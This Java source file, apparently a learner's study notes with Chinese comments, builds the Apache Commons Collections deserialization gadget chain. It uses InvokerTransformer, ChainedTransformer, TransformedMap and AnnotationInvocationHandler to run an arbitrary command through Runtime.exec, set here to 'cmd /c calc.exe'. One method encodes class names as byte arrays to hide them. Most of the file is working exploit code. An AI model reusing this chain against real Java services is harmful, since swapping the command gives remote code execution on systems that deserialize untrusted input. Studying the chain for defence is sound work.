package java_serialize;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;
import org.apache.commons.io.IOUtils;

import java.io.*;
import java.lang.annotation.Target;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.util.Arrays;
import java.util.HashMap;
import java.util.Map;


public class ApacheCommonsCollectionsVuln {
    private static final String cmd = "cmd /c calc.exe";

    private static final Transformer[] evil_tf_chain = new Transformer[]{

            new ConstantTransformer(Runtime.class),  // Runtime.class.
            new InvokerTransformer("getMethod", new Class[]{
                    String.class, Class[].class}, new Object[]{
                    "getRuntime", new Class[0]}
            ), // Runtime.class.getMethod("getRuntime")
            new InvokerTransformer("invoke", new Class[]{
                    Object.class, Object[].class}, new Object[]{
                    null, new Object[0]}
            ),// Runtime.class.getMethod("getRuntime").invoke(null)
            new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{cmd})
            // Runtime.class.getMethod("getRuntime").invoke(null).exec(cmd)

    };


    /**
     * 核心逻辑
     * * 使用ObjectOutputStream类的writeObject方法序列化DeserializationTest类，
     * * 使用ObjectInputStream类的readObject方法反序列化DeserializationTest类。
     *
     * @param object 任意类
     * @return object 任意类 理论上和输入一样
     */
    public static Object ObjectSerializeAndDeserializeWithStream(Object object) {
        try {
            // 创建用于存储payload的二进制输出流对象
            ByteArrayOutputStream baos = new ByteArrayOutputStream();

            // 创建Java对象序列化输出流对象
            ObjectOutputStream out = new ObjectOutputStream(baos);

            // 序列化AnnotationInvocationHandler类
            out.writeObject(object);
            out.flush();
            out.close();

            // 获取序列化的二进制数组
            byte[] bytes = baos.toByteArray();

            // 输出序列化的二进制数组
            System.out.println("Payload攻击字节数组：" + Arrays.toString(bytes));

            // 利用AnnotationInvocationHandler类生成的二进制数组创建二进制输入流对象用于反序列化操作
            ByteArrayInputStream bais = new ByteArrayInputStream(bytes);

            // 通过反序列化输入流(bais),创建Java对象输入流(ObjectInputStream)对象
            ObjectInputStream in = new ObjectInputStream(bais);

            // 模拟远程的反序列化过程
            Object object1 = in.readObject();

            // 关闭ObjectInputStream输入流
            in.close();

            return object1;
        } catch (IOException | ClassNotFoundException e) {
            e.printStackTrace();
        }
        return null;

    }

    public static void tryVuln() throws NoSuchMethodException, InvocationTargetException, IllegalAccessException, IOException {
//        Process a = (Process) Runtime.class.getMethod("getRuntime").getReturnType().getMethod("exec", String.class).invoke(
//                Runtime.class.getMethod("getRuntime").invoke(null), cmd);
        Process a = ((Runtime) Runtime.class.getMethod("getRuntime").invoke(null)).exec(cmd);
        Method m = a.getClass().getMethod("getInputStream");
        m.setAccessible(true);
        System.out.println(
                IOUtils.toString((InputStream) m.invoke(a), "GBK")
        );
    }

    /**
     * sun.reflect.annotation.AnnotationInvocationHandler类实现了java.lang.reflect.InvocationHandler(Java动态代理)接口和java.io.Serializable接口，
     * 它还重写了readObject方法，在readObject方法中还间接的调用了TransformedMap中MapEntry的setValue方法，
     * 从而也就触发了transform方法，完成了整个攻击链的调用。
     * <p>
     * AnnotationInvocationHandler 是一个内部API专用的类，在外部我们无法通过类名创建出AnnotationInvocationHandler类实例，但是没关系，我们有反射！
     */
    public static void AnnotationInvocationHandlerVuln() {
        try {
            // TODO 纳尼，我甚至把源码拷过来了，难道有什么不对的地方么？ 为啥计算器不弹了？
            Map<String, String> m = new HashMap<>();
            m.put("value", "value");
            Map<?, ?> transformedMap = TransformedMap.decorate(m, null, new ChainedTransformer(evil_tf_chain));
            Class<?> Aih = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
            Constructor<?> Aih_cons = Aih.getDeclaredConstructor(Class.class, Map.class);
            Aih_cons.setAccessible(true);
            Object obj = Aih_cons.newInstance(Target.class, transformedMap);
            ObjectSerializeAndDeserializeWithStream(obj);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }


    /**
     * TransformedMap 本意是对放入Map的键值对做一些转换。
     * 这转换的方法就是transformed类，而该类又存在着反序列化的方法来保存内容。由此就有了反序列化的漏洞
     */
    public static void TransformedMapVuln() {
        try {
            Transformer transformedChain = new ChainedTransformer(evil_tf_chain);
            Map<String, String> transformedMap = TransformedMap.decorate(new HashMap<String, String>(), null, transformedChain);
            // 构造函数为
            /*
            protected TransformedMap(Map map, Transformer keyTransformer, Transformer valueTransformer) {
                super(map);
                this.keyTransformer = keyTransformer;
                this.valueTransformer = valueTransformer;
            }
             */
            transformedMap.put("1", "1");
        } catch (Exception e) {
            e.printStackTrace();
        }
    }


    /**
     * .ChainedTransformer类实现了Transformer链式调用，
     * 我们只需要传入一个Transformer数组ChainedTransformer就可以实现依次的去调用每一个Transformer的transform方法。
     */
    public static void ChainedTransformerVuln() {
        try {
            // 其构造函数为传入一个 Transformer 数组
            /*
                public ChainedTransformer(Transformer[] transformers) {
                   this.iTransformers = transformers;
                }
             */

            // transform方法为对其循环调用
            /*
                  public Object transform(Object object) {
                      for (int i = 0; i < iTransformers.length; i++) {
                          object = iTransformers[i].transform(object);
                      }
                      return object;
                  }
             */
//            Runtime.getMethod(getRuntime()).exec("cmd");


            Transformer[] tf_array = new Transformer[]{
                    new ConstantTransformer(Runtime.class),  // Runtime.class.
                    new InvokerTransformer("getMethod", new Class[]{
                            String.class, Class[].class}, new Object[]{
                            "getRuntime", new Class[0]}
                    ), // Runtime.class.getMethod("getRuntime")
                    new InvokerTransformer("invoke", new Class[]{
                            Object.class, Object[].class}, new Object[]{
                            null, new Object[0]}
                    ),// Runtime.class.getMethod("getRuntime").invoke(null)
                    new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{cmd})
                    // Runtime.class.getMethod("getRuntime").invoke(null).exec(cmd)

            };
            /*
            Question : TODO
            按照这个Transformer链的意思，执行的语句应该是
                            Runtime.class.getMethod("getRuntime").invoke(null).exec(cmd)
                            但是这并不执行得了，因为invoke返回的是Object对象,Object对象是没有exec方法的
            按照写为一行的代码，真正能正确执行的语句应该是
                            ((Runtime) Runtime.class.getMethod("getRuntime").invoke(null)).exec(cmd)
                            这样才能正确执行。
            难道是我那一行的语句写的不对？还是这种invoke链式操作和实际写起来不一样？
            invoke返回的参数应该是一个Object才对，凭什么用ConstantTransformer就可以达到这样的效果呢？
             */

            ChainedTransformer ctf = new ChainedTransformer(tf_array);
            Process a = (Process) ctf.transform(null);
            Method m = a.getClass().getMethod("getInputStream");
            m.setAccessible(true);
            System.out.println(IOUtils.toString((InputStream) m.invoke(a), "GBK"));

        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    /**
     * 在Collections中提供了一个非常重要的类: org.apache.commons.collections.functors.InvokerTransformer，
     * 这个类实现了:java.io.Serializable接口。
     * <p>
     * InvokerTransformer类实现了org.apache.commons.collections.Transformer接口,
     * Transformer提供了一个对象转换方法：transform，
     * <br>主要用于将输入对象转换为输出对象。InvokerTransformer类的主要作用就是利用Java反射机制来创建类实例。</br>
     * <p>
     * public class InvokerTransformer implements Transformer, Serializable
     * 可见 InvokerTransformer 扩展了 序列化 与另一个啥的操作
     */
    public static void InvokerTransformerVuln() throws IOException {
        // 其构造函数为三个东西，一个是方法名，一个是参数类型列表，一个是参数列表
        /*
        public InvokerTransformer(String methodName, Class[] paramTypes, Object[] args) {
                this.iMethodName = methodName;
                this.iParamTypes = paramTypes;
                this.iArgs = args;
                }
         */

        // 其提供了一个方法，带入一个Object，可执行其Object.methodName(args)这样的方法
        /*
        public Object transform(Object input) {
                Class cls = input.getClass();
                Method method = cls.getMethod(this.iMethodName, this.iParamTypes);
                return method.invoke(input, this.iArgs);
         }
         */
        InvokerTransformer itf = new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{cmd});
        Process res = (Process) itf.transform(Runtime.getRuntime()); // 相当于 Runtime.getRuntime().exec(cmd)
        String res_output = IOUtils.toString(res.getInputStream(), "GBK");
        System.out.println(res_output);
    }

    /**
     * 综合一下前面所学的东西，写了一个用反射的方法
     */
    public static void InvokerTransformerMoreVuln() {
        try {
            Class<?> itf_class = Class.forName("org.apache.commons.collections.functors.InvokerTransformer");
            Constructor<?> itf_cons = itf_class.getConstructor(String.class, Class[].class, Object[].class); // 获取构造函数
            Object itf = itf_cons.newInstance("exec", new Class[]{String.class}, new Object[]{cmd}); // 创建instance
            Method transform = itf_class.getMethod("transform", Object.class);

            Class<?> evil_class = Class.forName(new String(new byte[]{106, 97, 118, 97, 46, 108, 97, 110, 103, 46, 82, 117, 110, 116, 105, 109, 101}));
            Method getRuntime = evil_class.getMethod(new String(new byte[]{103, 101, 116, 82, 117, 110, 116, 105, 109, 101}));

            transform.invoke(itf, getRuntime.invoke(null));

        } catch (ClassNotFoundException | NoSuchMethodException | IllegalAccessException | InstantiationException | InvocationTargetException e) {
            e.printStackTrace();
        }

    }


    public static void main(String[] args) throws Exception {
//        tryVuln();
//        InvokerTransformerVuln();
//        InvokerTransformerMoreVuln();
//        ChainedTransformerVuln();
//        TransformedMapVuln();
        AnnotationInvocationHandlerVuln();
    }

}
